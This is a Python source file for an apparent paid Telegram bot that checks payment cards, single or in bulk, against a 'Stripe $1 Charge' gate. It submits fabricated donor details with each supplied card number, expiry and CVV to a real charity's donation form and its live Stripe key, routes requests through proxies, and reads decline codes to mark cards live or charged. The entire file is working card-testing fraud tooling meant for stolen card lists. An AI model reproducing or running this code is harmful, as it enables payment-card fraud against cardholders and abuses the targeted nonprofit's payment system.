import re
import json
import requests
import asyncio
import html
import random
import uuid
from time import time
from urllib.parse import urlparse, parse_qs, urlencode
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
from BOT.tools.proxy import get_proxy

user_locks = {}


def check_stripe_card(cc, mm, yy, cvv, proxy=None):
    """Stripe $1 Charge check - EXACT original API"""
    try:
        s = requests.Session()
        
        if proxy:
            s.proxies = {'http': proxy, 'https': proxy}
        
        # Format year
        if len(yy) == 2:
            full_year = "20" + yy
        else:
            full_year = yy
            yy = yy[2:]
        
        # Format month
        if len(mm) == 1:
            mm = "0" + mm
        
        # Generate random user info
        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        username = (first_name + last_name).lower()
        random_digits = str(random.randint(1000, 9999))
        email = f"{username}{random_digits}@gmail.com"
        
        streets = ['123 Main St', '456 Oak Ave', '789 Pine Rd', '321 Elm St', '654 Maple Dr']
        cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
        states = ['NY', 'CA', 'IL', 'TX', 'AZ']
        zips = ['10001', '90001', '60601', '77001', '85001']
        
        idx = random.randint(0, 4)
        street = streets[idx]
        city = cities[idx]
        state = states[idx]
        zip_code = zips[idx]
        
        time_on_page = str(random.randint(100000, 150000))
        
        # Step 1: Get initial page
        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://livingroomconversations.org/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        s.get('https://livingroomconversations.org/donate/', headers=headers, timeout=30)

        # Step 2: Get donation form
        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://livingroomconversations.org/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        params = {
            'givewp-route': 'donation-form-view',
            'form-id': '1272',
            'locale': 'en_US',
        }

        response = s.get('https://livingroomconversations.org/', params=params, headers=headers, timeout=30)
        html_text = response.text

        # Extract donation URL and signature
        m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
        if not m:
            # Try alternative pattern
            m = re.search(r'givewp-route-signature=([^"&]+)', html_text)
            if m:
                sig = m.group(1)
                exp_m = re.search(r'givewp-route-signature-expiration=([^"&]+)', html_text)
                exp = exp_m.group(1) if exp_m else ""
            else:
                return "Declined ❌", "Form Error"
        else:
            donate_url = html.unescape(m.group(1))
            q = parse_qs(urlparse(donate_url).query)
            sig = q.get("givewp-route-signature", [""])[0]
            exp = q.get("givewp-route-signature-expiration", [""])[0]

        if not sig:
            return "Declined ❌", "Signature Error"

        # Step 3: Submit donation form
        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://livingroomconversations.org',
            'referer': 'https://livingroomconversations.org/?givewp-route=donation-form-view&form-id=1272&locale=en_US',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        params = {
            'givewp-route': 'donate',
            'givewp-route-signature': sig,
            'givewp-route-signature-id': 'givewp-donate',
            'givewp-route-signature-expiration': exp,
        }

        data = {
            'amount': '1',
            'currency': 'USD',
            'donationType': 'single',
            'subscriptionPeriod': 'one-time',
            'subscriptionFrequency': '1',
            'subscriptionInstallments': '0',
            'formId': '1272',
            'gatewayId': 'stripe_payment_element',
            'feeRecovery': '0',
            'fundId': '1',
            'firstName': first_name,
            'lastName': last_name,
            'anonymous': 'false',
            'email': email,
            'country': 'US',
            'address1': street,
            'address2': '',
            'city': city,
            'state': state,
            'zip': zip_code,
            'mailchimp': 'true',
            'donationBirthday': '',
            'originUrl': 'https://livingroomconversations.org/donate/',
            'isEmbed': 'true',
            'embedId': 'give-form-shortcode-1',
            'locale': 'en_US',
            'gatewayData[stripePaymentMethod]': 'card',
            'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
            'gatewayData[formId]': '1272',
            'gatewayData[stripeKey]': 'pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY',
            'gatewayData[stripeConnectedAccountId]': 'acct_1BI2rXLb2HpJQ5gR',
        }

        response = s.post('https://livingroomconversations.org/', params=params, headers=headers, data=data, timeout=30)
        
        try:
            resp = response.json()
        except:
            return "Declined ❌", "Invalid JSON Response"

        # Check for errors in response
        if "error" in resp:
            err_msg = resp.get("error", {}).get("message", str(resp.get("error", "Error")))
            return "Declined ❌", str(err_msg)[:40]
        
        if "data" not in resp:
            return "Declined ❌", f"No data in response"
        
        if "clientSecret" not in resp.get("data", {}):
            # Try to get error message
            msg = resp.get("data", {}).get("message", resp.get("message", ""))
            if msg:
                return "Declined ❌", str(msg)[:40]
            return "Declined ❌", "No clientSecret"

        # Extract client secret and payment intent
        client_secret = resp["data"]["clientSecret"]
        payment_intent = client_secret.split("_secret")[0]
        return_url = resp["data"].get("returnUrl", "")

        # Parse query params for receipt
        if return_url:
            qs = parse_qs(urlparse(return_url).query)
            receipt_id = qs.get("givewp-receipt-id", [""])[0] or qs.get("receipt-id", [""])[0]
        else:
            receipt_id = ""

        if receipt_id:
            final_return_url = (
                "https://livingroomconversations.org/donate/"
                "?givewp-event=donation-completed"
                "&givewp-listener=show-donation-confirmation-receipt"
                f"&givewp-receipt-id={receipt_id}"
                "&givewp-embed-id=give-form-shortcode-1"
            )
        else:
            final_return_url = return_url or "https://livingroomconversations.org/donate/"

        # Step 4: Confirm payment with Stripe
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        session_id = str(uuid.uuid4())
        config_id = str(uuid.uuid4())

        data = {
            "return_url": final_return_url,
            "payment_method_data[billing_details][name]": f"{first_name} {last_name}",
            "payment_method_data[billing_details][email]": email,
            "payment_method_data[billing_details][address][city]": city,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][line1]": street,
            "payment_method_data[billing_details][address][line2]": "",
            "payment_method_data[billing_details][address][postal_code]": zip_code,
            "payment_method_data[billing_details][address][state]": state,
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": yy,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[payment_user_agent]": "stripe.js/6675c28e57; stripe-js-v3/6675c28e57; payment-element; deferred-intent; autopm",
            "payment_method_data[referrer]": "https://livingroomconversations.org",
            "payment_method_data[time_on_page]": time_on_page,
            "payment_method_data[client_attribution_metadata][client_session_id]": session_id,
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
            "payment_method_data[client_attribution_metadata][elements_session_config_id]": config_id,
            "payment_method_data[guid]": guid,
            "payment_method_data[muid]": muid,
            "payment_method_data[sid]": sid,
            "expected_payment_method_type": "card",
            "client_context[currency]": "usd",
            "client_context[mode]": "payment",
            "use_stripe_sdk": "true",
            "key": "pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY",
            "_stripe_account": "acct_1BI2rXLb2HpJQ5gR",
            "client_secret": client_secret
        }

        response = s.post(
            f'https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm',
            headers=headers,
            data=data,
            timeout=30
        )
        
        try:
            resp_json = response.json()
        except:
            return "Declined ❌", "Invalid Stripe Response"

        # Parse response
        if 'error' in resp_json:
            error = resp_json['error']
            message = error.get('message', 'Declined')
            code = error.get('decline_code', error.get('code', ''))
            
            msg_lower = message.lower()
            code_lower = str(code).lower()
            
            # CVV/CVC errors = Approved (Live card)
            if 'cvc' in msg_lower or 'cvv' in msg_lower or 'security code' in msg_lower:
                return "Approved ✅", "CVV Error"
            # Insufficient funds = Approved (Live card)
            elif 'insufficient' in msg_lower or 'insufficient_funds' in code_lower:
                return "Approved ✅", "Insufficient Funds"
            # 3D Secure = Approved
            elif 'authentication' in msg_lower or '3d' in msg_lower:
                return "Approved ✅", "3D Secure"
            # Do not honor = Declined
            elif 'do_not_honor' in code_lower or 'do not honor' in msg_lower:
                return "Declined ❌", "Do Not Honor"
            # Declined
            elif 'decline' in msg_lower or 'declined' in msg_lower:
                return "Declined ❌", message[:40]
            # Invalid/Incorrect card
            elif 'card' in msg_lower and ('invalid' in msg_lower or 'incorrect' in msg_lower):
                return "Declined ❌", message[:40]
            # Expired
            elif 'expired' in msg_lower:
                return "Declined ❌", "Expired Card"
            # Lost/Stolen
            elif 'lost' in msg_lower or 'stolen' in msg_lower:
                return "Declined ❌", "Lost/Stolen Card"
            # Generic decline
            else:
                return "Declined ❌", message[:40] if message else code[:40]

        status_val = resp_json.get('status', '')
        if status_val == 'succeeded':
            return "Charged 💎", "Charged $1"
        elif status_val == 'requires_action':
            return "Approved ✅", "3D Secure Required"
        elif status_val == 'requires_capture':
            return "Charged 💎", "Authorized"
        elif status_val == 'processing':
            return "Approved ✅", "Processing"
        else:
            return "Declined ❌", f"Status: {status_val[:30]}"

    except requests.exceptions.Timeout:
        return "Declined ❌", "Timeout"
    except requests.exceptions.ProxyError:
        return "Declined ❌", "Proxy Error"
    except requests.exceptions.ConnectionError:
        return "Declined ❌", "Connection Error"
    except Exception as e:
        return "Declined ❌", str(e)[:40]


def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def check_stripe_charge(cc, mm, yy, cvv, proxy=None):
    """Stripe $1 charge check wrapper"""
    return check_stripe_card(cc, mm, yy, cvv, proxy)

def is_premium_user(user_id):
    """Check if user is premium"""
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return False
        plan = user.get("plan", {}).get("plan", "Free").upper()
        return plan not in ["FREE", "REDEEM CODE"]
    except:
        return False

def is_free_user(user_id):
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free").upper()
        return plan in ["FREE", "REDEEM CODE"]
    except:
        return True

def get_owner_link():
    return "https://t.me/gitsus"


@Client.on_message(filters.command("sc") & ~filters.edited)
async def stripe_charge_single(client, message):
    """Single card Stripe $1 Charge checker - Premium Only"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        # Premium only check
        if not is_premium_user(user_id):
            return await message.reply(
                "<pre>Notification ❗️</pre>\n"
                "<b>~ Message :</b> <code>Only For Premium Users !</code>\n"
                '<b>~ Buy Premium →</b> <b><a href="https://t.me/gitsus">Click Here</a></b>\n'
                "━━━━━━━━━━━━━\n"
                "<b>Type <code>/buy</code> to get Premium.</b>",
                reply_to_message_id=message.id
            )
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/sc cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/sc cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        proxy = get_proxy(message.from_user.id)
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>✦ [$sc] | Processing..!</pre>\n━━━━━━━━━━━━\n[•] Card- <code>{fullcc}</code>\n[•] Gate - <code>Stripe $1 Charge</code>",
            reply_to_message_id=message.id
        )
        
        loop = asyncio.get_event_loop()
        status, response = await loop.run_in_executor(None, check_stripe_card, cc, mm, yy, cvv, proxy)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        final_msg = f"""<b>[#StripeCharge] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{fullcc}</code>
<b>[•] Gateway -</b> <code>Stripe $1 Charge</code>
<b>[•] Status-</b> <code>{status}</code>
<b>[•] Response-</b> <code>{response}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {profile} [<code>{plan} {badge}</code>]
<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url=get_owner_link())
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error: {str(e)[:50]}</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("msc") & ~filters.edited)
async def stripe_charge_mass(client, message):
    """Mass Stripe $1 Charge checker - Premium Only"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    # Premium only check
    if not is_premium_user(user_id):
        return await message.reply(
            "<pre>Notification ❗️</pre>\n"
            "<b>~ Message :</b> <code>Only For Premium Users !</code>\n"
            '<b>~ Buy Premium →</b> <b><a href="https://t.me/gitsus">Click Here</a></b>\n'
            "━━━━━━━━━━━━━\n"
            "<b>Type <code>/buy</code> to get Premium.</b>",
            reply_to_message_id=message.id
        )
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /msc is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        # Card limits
        if plan.upper() == "ULTIMATE":
            mlimit = 100
        elif plan.upper() == "VIP":
            mlimit = 50
        else:
            mlimit = plan_info.get("mlimit", 10)
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            all_cards = all_cards[:mlimit]
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        # Clickable username
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> [<code>{plan} {badge}</code>]"
        
        proxy = get_proxy(message.from_user.id)
        
        loader_msg = await message.reply(
            f"<pre>✦ [$msc] | M-Stripe Charge</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Stripe $1 Charge</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_stripe_card, cc, mm, yy, cvv, proxy)
                
                final_results.append(
                    f"[•] <b>Card:</b> <code>{card}</code>\n"
                    f"[•] <b>Status:</b> <code>{status}</code>\n"
                    f"[•] <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                try:
                    display_results = final_results if len(final_results) <= 20 else final_results[-20:]
                    await loader_msg.edit(
                        f"<pre>✦ [$msc] | M-Stripe Charge</pre>\n"
                        + "\n".join(display_results) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[ﾒ] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        final_text = f"<pre>✦ [$msc] | M-Stripe Charge</pre>\n"
        final_text += "\n".join(final_results) + "\n"
        final_text += f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
        final_text += f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
        final_text += f"<b>[ﾒ] Checked By:</b> {checked_by}"
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url=get_owner_link())
            ]
        ])
        
        if len(final_text) > 4000:
            import os
            os.makedirs("downloads", exist_ok=True)
            filename = f"downloads/msc_results_{user_id}.txt"
            
            with open(filename, "w") as f:
                f.write("Mass Stripe Charge Results\n")
                f.write("=" * 50 + "\n\n")
                for result in final_results:
                    clean_result = result.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                    f.write(clean_result + "\n")
                f.write("\n" + "=" * 50 + "\n")
                f.write(f"Time taken: {timetaken}s\n")
                f.write(f"Total cards: {card_count}\n")
            
            await message.reply_document(
                filename,
                caption=f"<pre>✦ [$msc] | M-Stripe Charge Results</pre>\n"
                        f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
                        f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
                        f"<b>[ﾒ] Checked By:</b> {checked_by}",
                reply_to_message_id=message.id,
                reply_markup=buttons
            )
            await loader_msg.delete()
            os.remove(filename)
        else:
            await loader_msg.edit(
                final_text,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {str(e)[:50]}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
